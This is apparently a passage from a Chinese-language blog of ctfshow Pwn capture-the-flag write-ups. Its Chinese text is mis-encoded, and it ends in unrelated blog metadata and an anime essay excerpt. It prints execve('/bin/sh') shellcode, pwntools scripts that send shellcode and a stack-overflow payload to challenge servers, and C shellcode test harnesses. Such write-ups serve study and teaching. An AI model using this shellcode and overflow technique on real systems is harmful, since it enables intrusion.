68h ; &#x27;h&#x27;push 732F2F2Fhpush 6E69622Fhmov ebx, esp ; filexor ecx, ecx ; argvxor edx, edx ; envppush 0Bhpop eaxint 80h ; LINUX - sys_execvestart endp_text ends è¿™æ®µä»£ç æ˜¯x86æ±‡ç¼–è¯­è¨€çš„ä»£ç ï¼Œç”¨äºåœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œexecve(â€œ/bin//shâ€, NULL, NULL)ã€‚ æ‰€ä»¥æˆ‘ä»¬ä¸€è¿æ¥åˆ°æœåŠ¡å™¨å°±ä¼šç›´æ¥æ‹¿åˆ°Shellï¼š 123â””â”€$ nc pwn.challenge.ctf.show 28214cat ctfshow_flagctfshow&#123;7b0cc826-a180-4ce8-a26c-a4531b634162&#125; Pwn57 123456789â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn57/pwn&#x27; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable Stripped: No ï¼ˆæ³¨æ„åˆ°è¿™ä¸ªç¨‹åº¦çš„Stackæ˜¯Executableçš„ã€‚ï¼‰ 1234567891011121314151617public _start_start proc nearpush raxxor rdx, rdxxor rsi, rsimov rbx, 68732F2F6E69622Fhpush rbxpush rsppop rdimov al, 3Bh ; &#x27;;&#x27;syscall ; LINUX -_start endp_text endsend _start è¿™æ®µä»£ç æ˜¯x86-64æ±‡ç¼–è¯­è¨€çš„ä»£ç ï¼Œç”¨äºåœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œexecve(â€œ/bin//shâ€, NULL, NULL)ã€‚ push rax æŠŠ RAX å‹æ ˆï¼Œæ„å›¾æ˜¯ç»™åé¢çš„å­—ç¬¦ä¸²åšä¸€ä¸ª 8 å­—èŠ‚çš„ \\0 ç»ˆæ­¢ç¬¦ã€‚ xor rdx, rdx RDX = 0ï¼Œä½œä¸º envp = NULLã€‚ xor rsi, rsi RSI = 0ï¼Œä½œä¸º argv = NULLï¼ˆLinux å†…æ ¸å…è®¸ argv ä¸º NULLï¼Œç­‰ä»·äºç©ºå‚æ•°åˆ—è¡¨ï¼‰ã€‚ mov rbx, 68732F2F6E69622Fh æŠŠå¸¸é‡è£…å…¥ RBXã€‚æŒ‰å°ç«¯åºï¼Œè¿™ 8 å­—èŠ‚åœ¨å†…å­˜ä¸­æ˜¯å­—ç¬¦ä¸² &quot;/bin//sh&quot;ã€‚ push rbx æŠŠ &quot;/bin//sh&quot; å‹åˆ°æ ˆä¸Šï¼›è‹¥å‰é¢çš„ push rax æ˜¯ 0ï¼Œè¿™é‡Œå°±å¾—åˆ°ä»¥ NUL ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚ push rsp / pop rdi æŠŠå½“å‰ RSPï¼ˆä¹Ÿå°±æ˜¯åˆšå‹å…¥çš„å­—ç¬¦ä¸²åœ°å€ï¼‰æ”¾åˆ° RDIã€‚RDI å°†ä½œä¸º filename å‚æ•°ã€‚ mov al, 3Bh AL = 0x3Bï¼ˆåè¿›åˆ¶ 59ï¼‰ï¼Œx86-64 Linux ä¸Š execve çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚ syscall è§¦å‘ç³»ç»Ÿè°ƒç”¨ï¼šexecve(rdi=&quot;/bin//sh&quot;, rsi=NULL, rdx=NULL)ã€‚æˆåŠŸçš„è¯å½“å‰è¿›ç¨‹æ˜ åƒè¢« /bin//sh æ›¿æ¢ï¼Œè¿›å…¥äº¤äº’ shellï¼›å¤±è´¥åˆ™è¿”å›å¸¦ errno çš„è´Ÿå€¼åˆ° RAXã€‚ æ‰€ä»¥æˆ‘ä»¬ä¸€è¿æ¥åˆ°æœåŠ¡å™¨å°±ä¼šç›´æ¥æ‹¿åˆ°Shellï¼š 123â””â”€$ nc pwn.challenge.ctf.show 28291cat ctfshow_flagctfshow&#123;048529da-d481-45f2-9a88-7b900ccd1dbb&#125; Pwn5912345678910â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn59/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments Stripped: No 12345678910111213141516171819202122232425262728293031323334353637; int __fastcall main(int argc, const char **argv, const char **envp)public mainmain proc nearvar_B0= qword ptr -0B0hvar_A4= dword ptr -0A4hvar_A0= byte ptr -0A0h; __unwind &#123;push rbpmov rbp, rspsub rsp, 0B0hmov [rbp+var_A4], edimov [rbp+var_B0], rsimov rax, cs:__bss_startmov ecx, 0 ; nmov edx, 2 ; modesmov esi, 0 ; bufmov rdi, rax ; streamcall _setvbufmov eax, 0call logolea rdi, aJustVeryEasyRe ; &quot;Just very easy ret2shellcode&amp;&amp;64bit&quot;call _putslea rdi, aAttachIt ; &quot;Attach it!&quot;call _putslea rax, [rbp+var_A0]mov rdi, raxcall ctfshowlea rdx, [rbp+var_A0]mov eax, 0call rdxmov eax, 0leaveretn; &#125; // starts at 400686main endp ä¸çŸ¥é“IDAä¸ºä»€ä¹ˆæ²¡æ³•åæ±‡ç¼–è¿™æ®µã€‚ ç®€å•è§£é‡Šä¸€ä¸‹è¿™ä¸ªç¨‹åºï¼š å…³é—­/è°ƒæ•´ç¼“å†² -&gt; æ‰“å°æ¨ªå¹… -&gt; ä¸ºå±€éƒ¨ç¼“å†²åŒºè°ƒç”¨ ctfshowï¼ˆæŠŠæ•°æ®/ç”¨æˆ·è¾“å…¥æ”¾åˆ°ç¼“å†²åŒºï¼‰-&gt; ç„¶åæŠŠè¿™ä¸ªç¼“å†²åŒºå½“ä½œä»£ç æ‰§è¡Œï¼ˆcall bufferï¼‰ -&gt; è¿”å› 0ã€‚ æ‰€ä»¥è¯´æˆ‘ä»¬ç›´æ¥å‘é€ä¸€æ®µshellcodeå°±å¥½äº†ã€‚ å¯ä»¥åˆ©ç”¨Pwntoolsé‡Œçš„shellcodeå‡½æ•°é«˜æ•ˆå®ç°ï¼š 12345678910111213141516171819202122232425262728293031from pwn import *context(arch = &quot;amd64&quot;, os = &quot;linux&quot;)r = remote(&quot;pwn.challenge.ctf.show&quot;, 28112)shellcode = asm(shellcraft.sh())r.sendline(shellcode)r.interactive()# â””â”€$ python exp.py # [+] Opening connection to pwn.challenge.ctf.show on port 28112: Done# [*] Switching to interactive mode# â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„ # â–ˆâ–ˆâ–€â–€â–€â–€â–ˆ â–€â–€â–€â–ˆâ–ˆâ–€â–€â–€ â–ˆâ–ˆâ–€â–€â–€â–€â–€â–€ â–ˆâ–ˆ # â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆ â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ# â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–„â–„â–„â–„ â–€ â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–€â–ˆ â–ˆâ–ˆ â–ˆâ–€# â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–€â–€â–€â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–„â–ˆâ–ˆ # â–ˆâ–ˆâ–„â–„â–„â–„â–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–„â–„â–„â–„â–„â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–ˆâ–ˆâ–„â–„â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–ˆâ–ˆâ–€ # â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€ â–€â–€ â–€â–€ # * ************************************* # * Classify: CTFshow --- PWN --- å…¥é—¨ # * Type : Stack_Overflow # * Site : https://ctf.show/ # * Hint : Use shellcode to get shell! # * ************************************* # Just very easy ret2shellcode&amp;&amp;64bit# Attach it!# jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05# $ cat ctfshow_flag# ctfshow&#123;735fe74b-4c01-478c-bd38-803c64c7294f&#125;# $ # [*] Interrupted# [*] Closed connection to pwn.challenge.ctf.show port 28112 æ³¨æ„ï¼Œå…¶ä¸­è¿™è¡Œä»£ç éå¸¸é‡è¦ï¼š 1context(arch = &quot;amd64&quot;, os = &quot;linux&quot;) å®ƒè¿™è¡Œå‘Šè¯‰pwntoolsç›®æ ‡çš„CPUæ¶æ„å’Œæ“ä½œç³»ç»Ÿï¼ˆå³å¯„å­˜å™¨/ç³»ç»Ÿè°ƒç”¨çº¦å®šï¼‰ï¼Œå†³å®š shellcraft.sh() å’Œ asm() ç”Ÿæˆä»€ä¹ˆæ ·çš„æœºå™¨ç ã€‚ æˆ–è€…ï¼ˆåœ¨è¿™é“é¢˜é‡Œæˆ‘ä»¬å¯ä»¥ï¼‰ç›´æ¥å‘é€cat flagçš„å‘½ä»¤ï¼š12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)r = remote(&quot;pwn.challenge.ctf.show&quot;, 28112)# æ–¹æ³• Aï¼šç›´æ¥ execve /bin/catsc = asm(shellcraft.execve(&quot;/bin/cat&quot;, [&quot;cat&quot;, &quot;ctfshow_flag&quot;]))r.sendline(sc)# æˆ–è€…æ–¹æ³• Bï¼šé€šè¿‡ sh -cï¼ˆæ›´é€šç”¨ï¼Œé€‚åˆå¤æ‚å‘½ä»¤ï¼‰# sc = asm(shellcraft.execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;cat ctfshow_flag&quot;]))# r.sendline(sc)r.interactive()# â””â”€$ python exp.py # [+] Opening connection to pwn.challenge.ctf.show on port 28112: Done# [*] Switching to interactive mode# â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„ # â–ˆâ–ˆâ–€â–€â–€â–€â–ˆ â–€â–€â–€â–ˆâ–ˆâ–€â–€â–€ â–ˆâ–ˆâ–€â–€â–€â–€â–€â–€ â–ˆâ–ˆ # â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆ â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ# â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–„â–„â–„â–„ â–€ â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–€â–ˆ â–ˆâ–ˆ â–ˆâ–€# â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–€â–€â–€â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–„â–ˆâ–ˆ # â–ˆâ–ˆâ–„â–„â–„â–„â–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–„â–„â–„â–„â–„â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–ˆâ–ˆâ–„â–„â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–ˆâ–ˆâ–€ # â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€ â–€â–€ â–€â–€ # * ************************************* # * Classify: CTFshow --- PWN --- å…¥é—¨ # * Type : Stack_Overflow # * Site : https://ctf.show/ # * Hint : Use shellcode to get shell! # * ************************************* # Just very easy ret2shellcode&amp;&amp;64bit# Attach it!# H\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8.cho.ri\\x01H1\\x04$H\\x89\\xe7H\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8v^gm`f\\x01\\x01H1\\x04$H\\xb8t ctfshoPH\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8ri\\x01,b\\x01b`H1\\x04$1\\xf6Vj\\x0e^H\\x01\\xe6Vj\\x13^H\\x01\\xe6Vj\\x18^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05$ # ctfshow&#123;735fe74b-4c01-478c-bd38-803c64c7294f&#125;# [*] Got EOF while reading in interactive# $ # [*] Interrupted# [*] Closed connection to pwn.challenge.ctf.show port 28112 Pwn60 1234567891011â””â”€$ checksec pwn60[*] &#x27;/home/archer/ctf-kali/pwn/pwn60/pwn60&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No Debuginfo: Yes 12345678910111213141516171819202122232425262728293031323334353637383940414243; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nears= byte ptr -64hargc= dword ptr 8argv= dword ptr 0Chenvp= dword ptr 10h; __unwind &#123;push ebpmov ebp, espand esp, 0FFFFFFF0hadd esp, 0FFFFFF80hmov eax, ds:stdout@@GLIBC_2_0mov dword ptr [esp+0Ch], 0 ; nmov dword ptr [esp+8], 2 ; modesmov dword ptr [esp+4], 0 ; bufmov [esp], eax ; streamcall _setvbufmov eax, ds:stdin@@GLIBC_2_0mov dword ptr [esp+0Ch], 0 ; nmov dword ptr [esp+8], 1 ; modesmov dword ptr [esp+4], 0 ; bufmov [esp], eax ; streamcall _setvbufmov dword ptr [esp], offset s ; &quot;CTFshow-pwn can u pwn me here!!&quot;call _putslea eax, [esp+80h+s]mov [esp], eax ; scall _getsmov dword ptr [esp+8], 64h ; &#x27;d&#x27; ; nlea eax, [esp+80h+s]mov [esp+4], eax ; srcmov dword ptr [esp], offset buf2 ; destcall _strncpymov dword ptr [esp], offset format ; &quot;See you ~&quot;call _printfmov eax, 0leaveretn; &#125; // starts at 804852Dmain endp 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;CTFshow-pwn can u pwn me here!!&quot;); gets(s); strncpy(buf2, s, 0x64u); printf(&quot;See you ~&quot;); return 0;&#125; å‘ç°å¸¸è§æ¼æ´å‡½æ•°gets()ã€‚ ä¸‹é¢è¿˜ä½¿ç”¨strncpyå°†sçš„å†…å®¹å¤åˆ¶ç»™äº†buf2ã€‚ é€šè¿‡gdb/pwndbgå¯ä»¥å‘ç°bssæ®µæœ‰å¯æ‰§è¡Œæƒé™ã€‚ æ‰€ä»¥å…ˆå°†shellcodeå†™å…¥åˆ°bssæ®µï¼Œç„¶åä¿®æ”¹è¿”å›åœ°å€æ‰§è¡Œå®ƒã€‚ 12345678910111213from pwn import *context(arch = &#x27;i386&#x27;,os = &quot;linux&quot;)r = remote(&quot;pwn.challenge.ctf.show&quot;, 28288)buf2_addr = 0x804a080shellcode = asm(shellcraft.sh())payload = shellcode.ljust(112,b&quot;a&quot;) + p32(buf2_addr)r.sendline(payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# CTFshow-pwn can u pwn me here!!# See you ~ctfshow&#123;a5013d09-31f7-43a1-b2f0-e5b3161ac2e5&#125; ï¼ˆè¿˜æ²¡æœ‰å®Œå…¨ææ‡‚ä¸ºä»€ä¹ˆåç§»æ˜¯112ã€‚ç†è®ºä¸Šå¯ä»¥ç”¨gdbæµ‹è¯•å‡ºæ¥ã€‚ï¼‰ shellcode.ljust(112,b&quot;a&quot;)ï¼šljustå‡½æ•°ä¼šå°†shellcodeå­—ç¬¦ä¸²å¡«å……åˆ°é•¿åº¦ä¸º112çš„å­—ç¬¦ä¸²ä¸­ï¼Œå¹¶ç”¨&quot;a&quot;å¡«å……ç©ºä½™çš„éƒ¨åˆ†ã€‚ Pwn6224ä½çš„shellcodeï¼ˆæ¥æºï¼šhttps://www.exploit-db.com/exploits/43550 ï¼‰ï¼š 1234567891011121314151617181920212223242526272829/*global _startsection .text_start: push 59 pop rax cdq push rdx mov rbx,0x68732f6e69622f2f push rbx push rsp pop rdi push rdx push rdi push rsp pop rsi syscall*/#include &lt;stdio.h&gt;#include &lt;string.h&gt;char code[] = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot;;// char code[] = &quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot;;int main()&#123; printf(&quot;len:%d bytes\\n&quot;, strlen(code)); (*(void(*)()) code)(); return 0;&#125; Pwn6323ä½çš„shellcodeï¼ˆæ¥æºï¼šhttps://www.exploit-db.com/exploits/36858 ï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/* # # Execve /bin/sh Shellcode Via Push (Linux x86_64 23 bytes) # # Dying to be the shortest. # # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com) # # 27 April 2015 # # GPL # .global _start_start: # char *const argv[] xorl %esi, %esi # &#x27;h&#x27; &#x27;s&#x27; &#x27;/&#x27; &#x27;/&#x27; &#x27;n&#x27; &#x27;i&#x27; &#x27;b&#x27; &#x27;/&#x27; movq $0x68732f2f6e69622f, %rbx # for &#x27;\\x00&#x27; pushq %rsi pushq %rbx pushq %rsp # const char *filename popq %rdi # __NR_execve 59 pushq $59 popq %rax # char *const envp[] xorl %edx, %edx syscall *//* gcc -z execstack push64.c uname -r 3.19.3-3-ARCH */#include &lt;stdio.h&gt;#include &lt;string.h&gt;intmain(void)&#123; char *shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56&quot; &quot;\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;; printf(&quot;strlen(shellcode)=%d\\n&quot;, strlen(shellcode)); ((void (*)(void))shellcode)(); return 0;&#125; å †åˆ©ç”¨-å‰ç½®åŸºç¡€Pwn135 æ¥çœ‹ä¸€ä¸‹ç¨‹åºï¼š 12345678int __fastcall main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); logo(); menu(); ctfshow(); return 0;&#125; 12345678910111213141516int logo()&#123; puts(s); puts(asc_D40); puts(asc_DC0); puts(asc_E50); puts(asc_EE0); puts(asc_F68); puts(asc_1000); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Heap_Exploitation &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : Learn how to allocate heap ! &quot;); return puts(&quot; * ************************************* &quot;);&#125; 12345678int menu()&#123; puts(&quot;Choose a function to allocate heap memory:&quot;); puts(&quot;1. malloc&quot;); puts(&quot;2. calloc&quot;); puts(&quot;3. realloc&quot;); return printf(&quot;Enter your choice: &quot;);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849unsigned __int64 ctfshow()&#123; int v1; // [rsp+4h] [rbp-1Ch] BYREF size_t size; // [rsp+8h] [rbp-18h] BYREF void *ptr; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); ptr = 0; __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 == 2 ) &#123; printf(&quot;Enter the size to allocate using calloc: &quot;); __isoc99_scanf(&quot;%lu&quot;, &amp;size); ptr = calloc(1u, size); &#125; else if ( v1 &gt; 2 ) &#123; if ( v1 != 3 ) &#123; if ( v1 == 4 ) &#123; printf(&quot;Here is you want: &quot;); system(&quot;cat /ctfshow_flag&quot;); &#125; goto LABEL_12; &#125; printf(&quot;Enter the size to allocate using realloc: &quot;); __isoc99_scanf(&quot;%lu&quot;, &amp;size); ptr = realloc(ptr, size); &#125; else &#123; if ( v1 != 1 ) &#123;LABEL_12: puts(&quot;Invalid choice.&quot;); return __readfsqword(0x28u) ^ v4; &#125; printf(&quot;Enter the size to allocate using malloc: &quot;); __isoc99_scanf(&quot;%lu&quot;, &amp;size); ptr = malloc(size); &#125; if ( ptr ) printf(&quot;Memory allocated at address: %p\\n&quot;, ptr); else puts(&quot;Memory allocation failed.&quot;); return __readfsqword(0x28u) ^ v4;&#125; è¿™ä¸ªç¨‹åºä¸»è¦æ¼”ç¤ºäº†æ ‡å‡†åº“å †å†…å­˜åˆ†é…ï¼Œåˆ†åˆ«è°ƒç”¨ malloc/calloc/realloc ç”³è¯·æŒ‡å®šå¤§å°çš„å†…å­˜å¹¶æ‰“å°è¿”å›æŒ‡é’ˆï¼ŒåŒ…å«åˆ†é…å¤±è´¥ä¸éæ³•é€‰é¡¹å¤„ç†ã€‚ æ­£å¸¸æƒ…å†µï¼š é”™è¯¯æƒ…å†µï¼š ä½†è¿˜æ²¡ææ‡‚å¼€äº†PIEçš„ç¨‹åºè¯¥æ€ä¹ˆè°ƒè¯•ï¼š FLAGä¸éš¾æ³¨æ„åˆ°ï¼š 1234if ( v1 == 4 ) &#123; printf(&quot;Here is you want: &quot;); system(&quot;cat /ctfshow_flag&quot;); æ‰€ä»¥å‘é€4å³å¯è·å–flagã€‚ pwn136 12345678int __fastcall main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); logo(); menu(); ctfshow(); return 0;&#125; 12345678910111213141516int logo()&#123; puts(s); puts(asc_D80); puts(asc_E00); puts(asc_E90); puts(asc_F20); puts(asc_FA8); puts(asc_1040); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Heap_Exploitation &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : Learn how to free heap ! &quot;); return puts(&quot; * ************************************* &quot;);&#125; 12345678int menu()&#123; puts(&quot;Choose a pointer to free:&quot;); puts(&quot;1. ptr_malloc&quot;); puts(&quot;2. ptr_calloc&quot;); puts(&quot;3. ptr_realloc&quot;); return printf(&quot;Enter your choice: &quot;);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566unsigned __int64 ctfshow()&#123; int v1; // [rsp+Ch] [rbp-24h] BYREF void *ptr; // [rsp+10h] [rbp-20h] void *v3; // [rsp+18h] [rbp-18h] void *v4; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = 0; v4 = 0; ptr = malloc(4u); if ( ptr ) &#123; v3 = calloc(1u, 4u); if ( v3 ) &#123; v4 = realloc(0, 4u); if ( v4 ) &#123; __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 == 2 ) &#123; free(v3); puts(&quot;ptr_calloc freed.&quot;); return __readfsqword(0x28u) ^ v5; &#125; if ( v1 &gt; 2 ) &#123; if ( v1 == 3 ) &#123; free(v4); puts(&quot;ptr_realloc freed.&quot;); return __readfsqword(0x28u) ^ v5; &#125; if ( v1 == 4 ) &#123; printf(&quot;Here is you want: &quot;); system(&quot;cat /ctfshow_flag&quot;); &#125; &#125; else if ( v1 == 1 ) &#123; free(ptr); puts(&quot;ptr_malloc freed.&quot;); return __readfsqword(0x28u) ^ v5; &#125; puts(&quot;Invalid choice.&quot;); return __readfsqword(0x28u) ^ v5; &#125; puts(&quot;Memory allocation failed for ptr_realloc.&quot;); free(ptr); free(v3); &#125; else &#123; puts(&quot;Memory allocation failed for ptr_calloc.&quot;); free(ptr); &#125; &#125; else &#123; puts(&quot;Memory allocation failed for ptr_malloc.&quot;); &#125; return __readfsqword(0x28u) ^ v5;&#125; FLAGè¾“å…¥4å³å¯ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://archer-baiyi.github.io/tags/ctfshow/"}]},{"title":"æ‘˜å½•","slug":"ç¢ç¢å¿µ/æ‘˜å½•","date":"2025-10-04T17:40:28.000Z","updated":"2025-11-20T16:38:45.084Z","comments":true,"path":"2025/10/04/ç¢ç¢å¿µ/æ‘˜å½•/","permalink":"https://archer-baiyi.github.io/2025/10/04/%E7%A2%8E%E7%A2%8E%E5%BF%B5/%E6%91%98%E5%BD%95/","excerpt":"","text":"äºŒæ¬¡å…ƒï¼ˆ2025.10.04ï¼‰æ‰€ä»¥åœ¨æ—¶å…‰èŠ‚ç›®é‡ŒèŠã€ŠCharlotteã€‹ï¼Œä¸å…¶è¯´æ˜¯è¯„ä»·ä¸€éƒ¨ä½œå“ï¼Œä¸å¦‚è¯´æ˜¯åœ¨ä¸ˆé‡æˆ‘ä»¬è‡ªå·±åå¹´çš„æˆé•¿ã€‚åœ¨é˜…å†å°šæµ…çš„èŒæ–°æ—¶æœŸï¼Œä¸€äº›çŸ³ç ´å¤©æƒŠçš„å±•å¼€å’Œå‰æ‰€æœªè§çš„æƒ…æ„Ÿå†²å‡»ï¼Œå°±è¶³ä»¥è®©å…¶è¢«å¥‰ä¸ºå¿ƒä¸­çš„ç¥ä½œã€‚ä½†éšç€é˜…å†çš„æµè½¬ï¼Œæˆ‘ä»¬å¼€å§‹èƒ½è½»æ˜“çœ‹ç©¿é‚£äº›ç²—ç³™çš„æ¡†æ¶å’Œå¤±æ§çš„èŠ‚å¥ï¼Œç”šè‡³ä¼šå¿ä¸ä½æƒ³å˜²ç¬‘å½“å¹´è½»æ˜“ä¸ºæ­¢æµæ³ªçš„é’æ¶©çš„è‡ªå·±ã€‚ä½†â€åå¹´â€œå¥½å°±å¥½åœ¨å®ƒçœŸçš„è¶³å¤Ÿé•¿ï¼Œé•¿åˆ°é˜…å†è¿˜æœ‰ç€ç¬¬ä¸‰é‡æˆé•¿ï¼Œå¼€å§‹æ„è¯†åˆ°ï¼šçºµä½¿æŸäº›ä½œå“æœ‰ä¸‡èˆ¬ç¼ºç‚¹ï¼Œä½†åœ¨é‚£ä¸ªæˆ‘ä»¬è¿˜ä¸è¶³ä»¥è®¤è¯†å¾ˆå¤šä¸œè¥¿çš„å¹´çºªé‡Œï¼Œå®ƒæ›¾ç»™äºˆè¿‡æˆ‘ä»¬æœ€çœŸå®çš„æ„ŸåŠ¨ã€‚å°±åƒä¸€ä¸ªåæ ‡ï¼Œå›æœ›å®ƒï¼Œå°±èƒ½æ¸…æ™°åœ°çœ‹åˆ°è‡ªå·±èµ°äº†å¤šè¿œï¼Œç„¶åå¾®ç¬‘ç€æ‰¿è®¤ï¼Œé‚£ä¸ªå¾®ç¬‘çš„å¤å¤©å”¯ä¸€çš„ä¿¡ä»°ï¼Œæœ¬å°±ä¸å¿…å¤šä¹ˆé«˜å°šï¼›é‚£å¹´é‚‚é€…çš„ç™½æœˆå…‰ï¼Œä¹Ÿå¯ä»¥ä¸ç”¨é‚£ä¹ˆæ˜äº®ã€‚ ï¼ˆæ¥æºï¼šæ³›å¼ï¼Œæ–°ç•ªæ—¶å…‰æœºï¼Œ2015å¹´7æœˆç¯‡ï¼‰ 